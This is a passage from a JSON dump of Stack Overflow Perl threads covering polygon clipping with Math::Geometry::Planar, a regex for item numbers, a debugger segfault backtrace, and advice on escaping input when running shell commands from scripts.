the format of the data file</p>\n\n<pre><code>CLDN8   30214006    30216073    21  68\n\nA1C  20808776    20811809    Y   \n\nUBE2Q2P5Y   25431156    25437315    Y   \n\nOR5M9   56462469    56463401    11  390162\n</code></pre>\n\n<p>I want to search for the instances of items in the first or second column of the input file in the data file which should match up with the first and 5th column(which may not exist) respectively</p>\n\n<p>Expected output should be for this example</p>\n\n<pre><code>A1B 1   68 21 30214006    30216073\nA1C 299 0 Y 20808776    20811809\n</code></pre>\n\n<p>But I'm getting nothing</p>\n"}, {"tags": ["perl", "polygon", "gpc"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1463001465, "post_id": 37173210, "comment_id": 61881524, "body": "I would guess <a href=\"https://metacpan.org/pod/Math::Geometry::Planar#polygon-convert2gpc\" rel=\"nofollow noreferrer\"><code>$polygon-&gt;convert2gpc</code></a>..."}, {"owner": {"reputation": 13, "user_id": 6322497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2e32469735f830914240f758891629?s=128&d=identicon&r=PG&f=1", "display_name": "s.pan", "link": "https://stackoverflow.com/users/6322497/s-pan"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463058900, "post_id": 37173210, "comment_id": 61908723, "body": "OH, yes, Thank you!   it is so obviously. I am new to this module.."}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 6322497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2e32469735f830914240f758891629?s=128&d=identicon&r=PG&f=1", "display_name": "s.pan", "link": "https://stackoverflow.com/users/6322497/s-pan"}, "edited": false, "score": 0, "creation_date": 1463075025, "post_id": 37192646, "comment_id": 61920411, "body": "Thank you! My project is try to get a random point inside the intersection of two polygons.    I have created Planar Polygons, and now is try to get the intersection poly, and find a random point inside if intersection available.   After GpcClip, $diff is a gpc poly, when I use Gpc2Polygons, I can&#39;t get the point data. Can you help?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 13, "user_id": 6322497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2e32469735f830914240f758891629?s=128&d=identicon&r=PG&f=1", "display_name": "s.pan", "link": "https://stackoverflow.com/users/6322497/s-pan"}, "edited": false, "score": 0, "creation_date": 1463076039, "post_id": 37192646, "comment_id": 61921036, "body": "First, change <code>DIFFERENCE</code> to <code>INTERSECTION</code> in the call to <code>GpcClip</code>. <code>Gpc2Polygons</code> returns an array of polygons where the first element of the array represents the outer shape and the rest of the elements represent holes. So you need to check that your point is inside the first polygon, but not inside any of the holes. You can use the <a href=\"https://metacpan.org/pod/Math::Geometry::Planar#polygon-isinside-point\" rel=\"nofollow noreferrer\"><code>isinside</code></a> method for that."}, {"owner": {"reputation": 13, "user_id": 6322497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2e32469735f830914240f758891629?s=128&d=identicon&r=PG&f=1", "display_name": "s.pan", "link": "https://stackoverflow.com/users/6322497/s-pan"}, "edited": false, "score": 0, "creation_date": 1463077082, "post_id": 37192646, "comment_id": 61921639, "body": "@ThisSuitsBlackNot  Cause I just need the intersection and for sure no hole in my case. I just modified your code little bit, still no value after using Gpc2Polygons.                                                                                       I will post code below."}, {"owner": {"reputation": 13, "user_id": 6322497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2e32469735f830914240f758891629?s=128&d=identicon&r=PG&f=1", "display_name": "s.pan", "link": "https://stackoverflow.com/users/6322497/s-pan"}, "edited": false, "score": 0, "creation_date": 1463077622, "post_id": 37192646, "comment_id": 61921958, "body": "use strict; use warnings &#39;all&#39;;  use Math::Geometry::Planar;  my $outer = Math::Geometry::Planar-&gt;new; my $inner = Math::Geometry::Planar-&gt;new; $outer-&gt;points([[0, 0], [0, 3], [3, 3], [3, 0]]); $inner-&gt;points([[0, 2], [2, 2], [4, 2], [0, 4]]);  my $diff = GpcClip(&#39;INTERSECTION&#39;, $outer-&gt;convert2gpc, $inner-&gt;convert2gpc); my @pgons = Gpc2Polygons($diff);  my $result = Math::Geometry::Planar-&gt;new;  $result = $pgons[0];  print $result;  my $points = $result-&gt;points();  print $points;"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 13, "user_id": 6322497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2e32469735f830914240f758891629?s=128&d=identicon&r=PG&f=1", "display_name": "s.pan", "link": "https://stackoverflow.com/users/6322497/s-pan"}, "edited": false, "score": 0, "creation_date": 1463077729, "post_id": 37192646, "comment_id": 61922018, "body": "@s.pan <code>$result</code> is a Math::Geometry::Planar object and <code>$points</code> is an array reference. You can&#39;t just print objects and references with <code>print</code>, that will just output their locations in memory. You can use <a href=\"http://perldoc.perl.org/Data/Dumper.html\" rel=\"nofollow noreferrer\">Data::Dumper</a> to debug complex data structures. If you still can&#39;t figure it out after using Data::Dumper, I would post a new question; comments aren&#39;t very good for long bits of code."}], "tags": [], "owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "is_accepted": false, "score": 1, "last_activity_date": 1463070676, "last_edit_date": 1592644375, "creation_date": 1463070676, "answer_id": 37192646, "question_id": 37173210, "link": "https://stackoverflow.com/questions/37173210/how-can-i-create-a-gpc-polygon-to-use-with-mathgeometryplanargpcclip/37192646#37192646", "title": "How can I create a GPC polygon to use with Math::Geometry::Planar::GpcClip?", "body": "<p>According to the <a href=\"https://metacpan.org/pod/Math::Geometry::Planar#polygon-convert2gpc\" rel=\"nofollow noreferrer\">documentation</a>, you can use the <code>convert2gpc</code> method:</p>\n<blockquote>\n<p><strong>$polygon-&gt;convert2gpc;</strong></p>\n<p>Converts a polygon/contour to a gpc structure and returns the resulting gpc structure</p>\n</blockquote>\n<p>Example:</p>\n<pre><code>use strict;\nuse warnings 'all';\n\nuse Math::Geometry::Planar;\n\nmy $outer = Math::Geometry::Planar-&gt;new;\nmy $inner = Math::Geometry::Planar-&gt;new;\n$outer-&gt;points([[0, 0], [0, 3], [3, 3], [3, 0]]);\n$inner-&gt;points([[1, 1], [1, 2], [2, 2], [2, 1]]);\n\nmy $diff = GpcClip('DIFFERENCE', $outer-&gt;convert2gpc, $inner-&gt;convert2gpc);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1463154501, "post_id": 37195437, "comment_id": 61959911, "body": "You posted this as an answer, but I think you meant to post it as <a href=\"http://stackoverflow.com/questions/ask\">another question</a>."}, {"owner": {"reputation": 13, "user_id": 6322497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2e32469735f830914240f758891629?s=128&d=identicon&r=PG&f=1", "display_name": "s.pan", "link": "https://stackoverflow.com/users/6322497/s-pan"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1463168895, "post_id": 37195437, "comment_id": 61967499, "body": "@ ThisSuitIsBlackNot There are more questions, for this question, it is solved at least..:)"}], "tags": [], "owner": {"reputation": 13, "user_id": 6322497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2e32469735f830914240f758891629?s=128&d=identicon&r=PG&f=1", "display_name": "s.pan", "link": "https://stackoverflow.com/users/6322497/s-pan"}, "is_accepted": false, "score": -1, "last_activity_date": 1463079847, "creation_date": 1463079847, "answer_id": 37195437, "question_id": 37173210, "link": "https://stackoverflow.com/questions/37173210/how-can-i-create-a-gpc-polygon-to-use-with-mathgeometryplanargpcclip/37195437#37195437", "title": "How can I create a GPC polygon to use with Math::Geometry::Planar::GpcClip?", "body": "<pre><code>use strict;\nuse warnings 'all';\nuse Data::Dumper;\nuse Math::Geometry::Planar;\n\nmy $outer = Math::Geometry::Planar-&gt;new;\nmy $inner = Math::Geometry::Planar-&gt;new;\n$outer-&gt;points([[0, 0], [0, 3], [3, 3], [3, 0],[0,0]]);\n$inner-&gt;points([[2, 0], [2, 2], [4, 2], [4, 0],[2,0]]);\n\nmy $diff = GpcClip('INTERSECTION', $outer-&gt;convert2gpc, $inner-&gt;convert2gpc);\n#first polygon rep the outer poly, the rest of them are holes\nmy @pgons = Gpc2Polygons($diff);  \n\n#since here we don't have holes, only the first one is a valid polygon \nprint Dumper($pgons[0]-&gt;polygons-&gt;[0]);\n\n#convert the points into Planar Polygon\nmy $result = Math::Geometry::Planar-&gt;new;\n$result-&gt;points($pgons[0]-&gt;polygons-&gt;[0]);\n\nprint Dumper($result);\n</code></pre>\n\n<p>Appreciate the help from @ThisSuitlsBlackNot .  By the way, do you have any idea to find a random point inside a polygon, this polygon doesn't have hole.\nThanks again</p>\n"}], "owner": {"reputation": 13, "user_id": 6322497, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2e32469735f830914240f758891629?s=128&d=identicon&r=PG&f=1", "display_name": "s.pan", "link": "https://stackoverflow.com/users/6322497/s-pan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 265, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1463079847, "creation_date": 1463000446, "last_edit_date": 1463070645, "question_id": 37173210, "link": "https://stackoverflow.com/questions/37173210/how-can-i-create-a-gpc-polygon-to-use-with-mathgeometryplanargpcclip", "title": "How can I create a GPC polygon to use with Math::Geometry::Planar::GpcClip?", "body": "<p>I am trying to use the <code>GpcClip()</code> function from <a href=\"https://metacpan.org/pod/Math::Geometry::Planar\" rel=\"nofollow\">Math::Geometry::Planar</a> to find the intersection of two polygons. I built two polygons by using <code>Math::Geometry::Planar-&gt;new();</code> but I got the following error when I used them in <code>GpcClip()</code>:</p>\n\n<blockquote>\n  <p>Type error in argument 2 of gpc_polygon_clip. Expected _p_gpc_polygon at c:/strawberry/perl/site/lib/math/geometry/planar.pm line 2028</p>\n</blockquote>\n\n<p>How can I convert the object returned by <code>Math::Geometry::Planar-&gt;new()</code> into a GPC polygon?</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 1, "creation_date": 1462996605, "post_id": 37172106, "comment_id": 61878970, "body": "Yes, because <code>.*</code> gobbles up <b>everything</b> after the <code>#</code> up to a final <code>\\S</code> (which would be the <code>&quot;)&quot;</code> of <code>&quot;skid)&quot;</code> in your case). Try <code>&#47;(#\\S+)&#47;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 935, "user_id": 2262777, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/rLSZZ.jpg?s=128&g=1", "display_name": "AlliDeacon", "link": "https://stackoverflow.com/users/2262777/allideacon"}, "edited": false, "score": 0, "creation_date": 1462997558, "post_id": 37172159, "comment_id": 61879453, "body": "Ok, I&#39;m still having some trouble, if I do  <code>&#39;&#47;(#\\S+)&#47;&#39;</code> I&#39;m not getting anything.  If I do <code>&#39;&#47;(#\\S*)&#47;&#39;</code>  I am only getting the &quot;#&quot; sign.  Any thoughts?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 935, "user_id": 2262777, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/rLSZZ.jpg?s=128&g=1", "display_name": "AlliDeacon", "link": "https://stackoverflow.com/users/2262777/allideacon"}, "edited": false, "score": 1, "creation_date": 1462999079, "post_id": 37172159, "comment_id": 61880273, "body": "@AlliDeacon  Try this:     <code>perl -wE &#39;$str = &quot;item description is blah ablha blabh albhalbh #thisisitemnumber x&#47;skid)&quot;; ($m) = $str =~ &#47;(#\\S+)&#47;; say $m&#39;</code>.   It prints <code>#thisisitemnumber</code> for me."}, {"owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "reply_to_user": {"reputation": 935, "user_id": 2262777, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/rLSZZ.jpg?s=128&g=1", "display_name": "AlliDeacon", "link": "https://stackoverflow.com/users/2262777/allideacon"}, "edited": false, "score": 0, "creation_date": 1462999753, "post_id": 37172159, "comment_id": 61880636, "body": "@AlliDeacon Is <code>#thisisitemnumber</code> your actual input? Not something like <code># 12.34</code>? The name suggests it is a <b>number</b>. Please show a real (non-simplified) example."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 935, "user_id": 2262777, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/rLSZZ.jpg?s=128&g=1", "display_name": "AlliDeacon", "link": "https://stackoverflow.com/users/2262777/allideacon"}, "edited": false, "score": 1, "creation_date": 1463000054, "post_id": 37172159, "comment_id": 61880793, "body": "@AlliDeacon  I think it would have to do with what exact strings you&#39;re feeding it.  What you state would happen if you give it a string without anything after <code>#</code>, for example.  If the problem persists please post typical input that you may need to deal with. The question as it stands implies that your input has <code>#something </code>.  If input can be different we need to know that."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 935, "user_id": 2262777, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/rLSZZ.jpg?s=128&g=1", "display_name": "AlliDeacon", "link": "https://stackoverflow.com/users/2262777/allideacon"}, "edited": false, "score": 0, "creation_date": 1463000909, "post_id": 37172159, "comment_id": 61881232, "body": "@AlliDeacon  If you can have strings ending with <code>#</code> or having a space after it  (like <code># other...</code>) then you have a design decision to make.  Either have <i>nothing</i> captured (code as it stands), or capture <code>#</code> alone -- for this change the <code>+</code> to <code>*</code>.  If you want to pick up the number even if there is a space in there, like in <code># 13</code>, then the regex would have to be modified to allow an optional single (stretch of) space after <code>#</code>, for example."}, {"owner": {"reputation": 935, "user_id": 2262777, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/rLSZZ.jpg?s=128&g=1", "display_name": "AlliDeacon", "link": "https://stackoverflow.com/users/2262777/allideacon"}, "reply_to_user": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "edited": false, "score": 0, "creation_date": 1463431887, "post_id": 37172159, "comment_id": 62052717, "body": "@PerlDog I had an issue within my Reporting Tool, and needed to include &#39;%&#39; for &quot;LIKE&quot;, or include all characters but Space, not using \\S or \\s.  Thank you for your input, it was very helpful, I apologize for my lack of response to comments after."}, {"owner": {"reputation": 935, "user_id": 2262777, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/rLSZZ.jpg?s=128&g=1", "display_name": "AlliDeacon", "link": "https://stackoverflow.com/users/2262777/allideacon"}, "edited": false, "score": 0, "creation_date": 1463431939, "post_id": 37172159, "comment_id": 62052739, "body": "@zdim Your solution worked perfectly, but not inside my reporting tool.  I needed to include &quot;%&quot;  for like, but ended up just including all characters.  Thanks!"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 935, "user_id": 2262777, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/rLSZZ.jpg?s=128&g=1", "display_name": "AlliDeacon", "link": "https://stackoverflow.com/users/2262777/allideacon"}, "edited": false, "score": 0, "creation_date": 1463432932, "post_id": 37172159, "comment_id": 62053217, "body": "@AlliDeacon  Thanks for the response -- I don&#39;t understand what <code>&quot;%&quot; for like</code> means.  Can you explain, maybe we can adjust this so to work for that case as well?  I apologize if it is something obvious that I am not seeing.  I also don&#39;t understand your previous comment -- do you need to do this without using <code>\\S</code> and <code>\\s</code> for some reason?"}, {"owner": {"reputation": 935, "user_id": 2262777, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/rLSZZ.jpg?s=128&g=1", "display_name": "AlliDeacon", "link": "https://stackoverflow.com/users/2262777/allideacon"}, "edited": false, "score": 0, "creation_date": 1463489929, "post_id": 37172159, "comment_id": 62079141, "body": "@zdim using the &quot;%&quot; in the beginning and end of the expression equal &quot;LIKE&quot; in this particular tool.  If I had used that initially the \\S and \\s would have worked like this: <code>like(@[Item Description], &#39;%&#47;(#\\S+)&#47;%&#39;)</code>  It was a solution I didn&#39;t think of until the Software Support suggested it."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 4, "last_activity_date": 1463000491, "last_edit_date": 1463000491, "creation_date": 1462996658, "answer_id": 37172159, "question_id": 37172106, "link": "https://stackoverflow.com/questions/37172106/perl-regex-help-matching-a-string-in-a-field/37172159#37172159", "title": "PERL Regex help matching a string in a field", "body": "<p>You are matching any char <code>.</code> any number of times <code>*</code> until non-space <code>\\S</code>. This isn't really what you want. Also, since <code>*</code> is greedy it scoops up everything up to the <em>last</em> non-space in the string. </p>\n\n<p>You want non-space one or more times:</p>\n\n<pre><code>/(#\\S+)/;\n</code></pre>\n\n<p>This presumes that there should be <em>something</em> after <code>#</code>, thus the <code>+</code></p>\n"}], "owner": {"reputation": 935, "user_id": 2262777, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/rLSZZ.jpg?s=128&g=1", "display_name": "AlliDeacon", "link": "https://stackoverflow.com/users/2262777/allideacon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 73, "favorite_count": 0, "accepted_answer_id": 37172159, "answer_count": 1, "score": 1, "last_activity_date": 1463000491, "creation_date": 1462996461, "question_id": 37172106, "link": "https://stackoverflow.com/questions/37172106/perl-regex-help-matching-a-string-in-a-field", "title": "PERL Regex help matching a string in a field", "body": "<p>I currently have a field that looks like this.</p>\n\n<p><code>item description is blah ablha blabh albhalbh  #thisisitemnumber x/skid)</code></p>\n\n<p>I am trying to extract the <code>#thisisitemnumber</code> portion.  I currently have this:</p>\n\n<p><code>'/(#.*\\S)/'</code></p>\n\n<p>But using that I get everything after the \"#\" even the whitespace. \nAny help is appreciated!</p>\n\n<p>Thanks :)</p>\n"}, {"tags": ["perl", "debugging", "segmentation-fault", "coredump"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1462994583, "post_id": 37171456, "comment_id": 61877818, "body": "Reinstall `Term::ReadLine::Gnu&#39;?"}, {"owner": {"reputation": 1523, "user_id": 2079373, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/etR7x.png?s=128&g=1", "display_name": "tale852150", "link": "https://stackoverflow.com/users/2079373/tale852150"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1462995751, "post_id": 37171456, "comment_id": 61878463, "body": "Are you using an old version of Perl (you appear to be using Perl 5.10)?  If that is the case, maybe you could try a more recent version of Perl.  I believe 5.24 just got released/dropped a few days ago.  Maybe try 5.22 along with what user @mob suggested above.  It would be helpful if we had an idea of your environment and some code (if possible),  HTH"}, {"owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "edited": false, "score": 0, "creation_date": 1462997669, "post_id": 37171456, "comment_id": 61879506, "body": "Yes, perl 5.10 is <i>very</i> old. Perl developers won&#39;t take a bug report unless you&#39;re using the latest stable release. Depending on your distro, you may want to build perl from source from <a href=\"https://www.perl.org\" rel=\"nofollow noreferrer\">perl.org</a> When I got fedora 22, it came with perl 5.20 and started segfaulting on scripts that had run for a decade. See my answer here for what I did to install perl: <a href=\"https://serverfault.com/questions/741186/cpan-is-using-old-perl-version-to-install-modules/741216#741216\" title=\"cpan is using old perl version to install modules\">serverfault.com/questions/741186/&hellip;</a>"}], "owner": {"reputation": 618, "user_id": 1189819, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/FpXGg.jpg?s=128&g=1", "display_name": "Jerome Provensal", "link": "https://stackoverflow.com/users/1189819/jerome-provensal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 226, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1462994042, "creation_date": 1462994042, "question_id": 37171456, "link": "https://stackoverflow.com/questions/37171456/getting-segv-core-dumped-when-running-perl-debugger", "title": "Getting SEGV / core dumped when running Perl debugger", "body": "<p>When I try to run the Perl debugger I'm getting a SEGV error:</p>\n\n<pre><code>Signal SEGV at /opt/csw/lib/perl/csw/Term/ReadLine/Gnu.pm line 240.\n        Term::ReadLine::Gnu::new(\"Term::ReadLine\", \"perldb\", GLOB(0x81c1168), GLOB(0x81873a0)) called at /opt/csw/share/perl/5.10.1/perl5db.pl line 6073\n        DB::setterm called at /opt/csw/share/perl/5.10.1/perl5db.pl line 2237\n        DB::DB called at -e line 1\n Abort (core dumped)\n</code></pre>\n\n<p>The errors takes place with any Perl code and I think is due to the debugger using Term::ReadLine::Gnu::new.</p>\n\n<p>Using gdb to get the stack trace, I get the following:</p>\n\n<pre><code>Core was generated by `/opt/csw/bin/perl -de$a++'.\nProgram terminated with signal 6, Aborted.\n#0  0xfeaabbc5 in kill () from /lib/libc.so.1\n(gdb) bt\n#0  0xfeaabbc5 in kill () from /lib/libc.so.1\n#1  0xfef0c748 in Perl_apply () from /opt/csw/lib/i386/libperl.so\n#2  0xfeeff1ee in Perl_pp_chown () from /opt/csw/lib/i386/libperl.so\n#3  0xfeeb6721 in Perl_runops_standard () from /opt/csw/lib/i386/libperl.so\n#4  0xfee570da in Perl_call_sv () from /opt/csw/lib/i386/libperl.so\n#5  0xfeeac2c8 in Perl_sighandler () from /opt/csw/lib/i386/libperl.so\n#6  0xfeea8173 in Perl_csighandler () from /opt/csw/lib/i386/libperl.so\n#7  0xfeaa8ecf in __sighndlr () from /lib/libc.so.1\n#8  0xfea9eb8f in call_user_handler () from /lib/libc.so.1\n#9  &lt;signal handler called&gt;\n#10 0xfe82b828 in baudrate () from /lib/libcurses.so.1\n#11 0xfe7ede48 in _nc_setupterm () from /opt/csw/lib/libncurses.so.5\n#12 0xfe7ee010 in tgetent () from /opt/csw/lib/libncurses.so.5\n#13 0xfe88659a in _rl_init_terminal_io () from /opt/csw/lib/i386/libreadline.so.6\n#14 0xfe86eb32 in readline_initialize_everything () from /opt/csw/lib/i386/libreadline.so.6\n#15 0xfe86ea22 in rl_initialize () from /opt/csw/lib/i386/libreadline.so.6\n#16 0xfe8d6e1d in XS_Term__ReadLine__Gnu__XS_rl_initialize () from /opt/csw/lib/perl/csw/auto/Term/ReadLine/Gnu/Gnu.so\n#17 0xfeebe7ee in Perl_pp_entersub () from /opt/csw/lib/i386/libperl.so\n#18 0xfeeb6721 in Perl_runops_standard () from /opt/csw/lib/i386/libperl.so\n#19 0xfee568f1 in S_run_body () from /opt/csw/lib/i386/libperl.so\n#20 0xfee56813 in perl_run () from /opt/csw/lib/i386/libperl.so\n#21 0x08050b48 in main ()\n</code></pre>\n\n<p>I would greatly appreciate any help/clues.</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["php", "bash", "perl", "sh"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1462985535, "post_id": 37168778, "comment_id": 61872609, "body": "This is pretty broad. In general, if the language has a built-in way to do something, you should use that instead of spawning a subprocess, but there are lots of exceptions, and there are times when your only option is to run an external command. Do you have a specific example in mind?"}, {"owner": {"reputation": 3088, "user_id": 1843389, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35aed40c724f616980255cca4ae0ab73?s=128&d=identicon&r=PG", "display_name": "E_p", "link": "https://stackoverflow.com/users/1843389/e-p"}, "edited": false, "score": 1, "creation_date": 1462985635, "post_id": 37168778, "comment_id": 61872665, "body": "Short answer better not too. But if you have to make sure that user input is screened properly to avoid any inclusion attacks. And execute nothing as superuser"}], "answers": [{"tags": [], "owner": {"reputation": 526, "user_id": 6307642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a4c7a34acc390b2f0945b90f04ea3bf1?s=128&d=identicon&r=PG&f=1", "display_name": "ebahi", "link": "https://stackoverflow.com/users/6307642/ebahi"}, "is_accepted": false, "score": 0, "last_activity_date": 1462985580, "last_edit_date": 1495535295, "creation_date": 1462985580, "answer_id": 37168855, "question_id": 37168778, "link": "https://stackoverflow.com/questions/37168778/is-it-a-good-practice-to-execute-terminal-commands-from-a-perl-php-script/37168855#37168855", "title": "Is it a good practice to execute terminal commands from a perl/ php script?", "body": "<p>Why not ?</p>\n\n<p>But, be careful and escape all strings inserted in the command :</p>\n\n<ul>\n<li>In PHP : <a href=\"http://php.net/manual/fr/function.escapeshellarg.php\" rel=\"nofollow noreferrer\">escapeshellarg()</a></li>\n<li>In Perl : <a href=\"https://stackoverflow.com/questions/3212128/perl-equivalent-of-phps-escapeshellarg\">Perl equivalent of PHP&#39;s escapeshellarg</a></li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462986776, "post_id": 37169148, "comment_id": 61873315, "body": "<code>mkdir -p</code> isn&#39;t a great example since Perl has <a href=\"http://perldoc.perl.org/File/Path.html\" rel=\"nofollow noreferrer\"><code>File::Path::make_path</code></a> in core."}, {"owner": {"reputation": 41, "user_id": 6320360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/865a234d0e895cabe36edcc3e5e48d83?s=128&d=identicon&r=PG&f=1", "display_name": "Suzie", "link": "https://stackoverflow.com/users/6320360/suzie"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 2, "creation_date": 1462988969, "post_id": 37169148, "comment_id": 61874700, "body": "Just making a point that especially gnu versions of commands have many switches with functionality not available in perl functions. Of course, there are modules for everything but you have to include them..."}], "tags": [], "owner": {"reputation": 41, "user_id": 6320360, "user_type": "registered", 